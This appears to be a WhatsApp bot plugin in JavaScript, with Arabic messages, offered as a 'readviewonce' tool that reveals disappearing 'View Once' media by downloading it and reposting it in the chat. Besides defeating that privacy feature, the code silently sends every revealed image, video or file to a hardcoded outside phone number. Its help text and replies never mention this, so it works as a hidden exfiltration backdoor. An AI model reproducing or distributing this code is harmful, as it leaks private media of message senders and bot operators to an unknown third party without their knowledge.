const handler = async (m, { conn }) => {
    console.log("✅ تم استدعاء handler");
    
    try {
        if (!m.quoted || !m.quoted.message) {
            console.log("❌ لا توجد رسالة مقتبسة.");
            return m.reply('*〘 👁️‍🗨️ 〙 رد على رسالة View Once لكشفها.*');
        }

        console.log("✅ تم اكتشاف رسالة مقتبسة.");
        let mtype = Object.keys(m.quoted.message)[0];

        if (!mtype) {
            console.log("❌ لا يمكن التعرف على نوع الوسائط.");
            return m.reply('*〘 ❌ 〙 لا يمكن التعرف على نوع الوسائط.*');
        }

        console.log("✅ نوع الوسائط:", mtype);
        
        let buffer;
        try {
            buffer = await m.quoted.download();
            console.log("✅ تم تحميل الوسائط بنجاح.");
        } catch (err) {
            console.log("❌ فشل في تحميل الوسائط.", err);
            return m.reply('*〘 ❌ 〙 فشل في تحميل الوسائط. تأكد من أنك ترد على وسائط View Once.*');
        }

        if (!buffer) {
            console.log("❌ الوسائط غير متوفرة.");
            return m.reply('*〘 ❌ 〙 الوسائط غير متوفرة أو لا يمكن تحميلها.*');
        }

        const num = "201153573240@s.whatsapp.net"; 
        let caption = m.quoted.message[mtype]?.caption || '';
        let mediaType = mtype.replace(/Message$/, '');

        const supportedMedia = ["image", "video", "document", "audio", "sticker"];
        if (!supportedMedia.includes(mediaType)) {
            console.log("❌ نوع الوسائط غير مدعوم.");
            return m.reply('*〘 ⚠️ 〙 هذا النوع من الوسائط غير مدعوم.*');
        }

        console.log("✅ جاري إرسال الوسائط...");
        await conn.sendMessage(m.chat, { [mediaType]: buffer, caption }, { quoted: m });
        await conn.sendMessage(num, { [mediaType]: buffer, caption }, { quoted: m });

        console.log("✅ تم إرسال الوسائط بنجاح.");
        m.reply('*✅ تم كشف وإرسال الوسائط بنجاح.*');

    } catch (e) {
        console.error("❌ حدث خطأ:", e);
        m.reply('*〘 ⚠️ 〙حدث خطأ:* \n' + e.message);
    }
};

handler.help = ['readviewonce'];
handler.tags = ['tools'];
handler.command = ['كشف'];

export default handler;
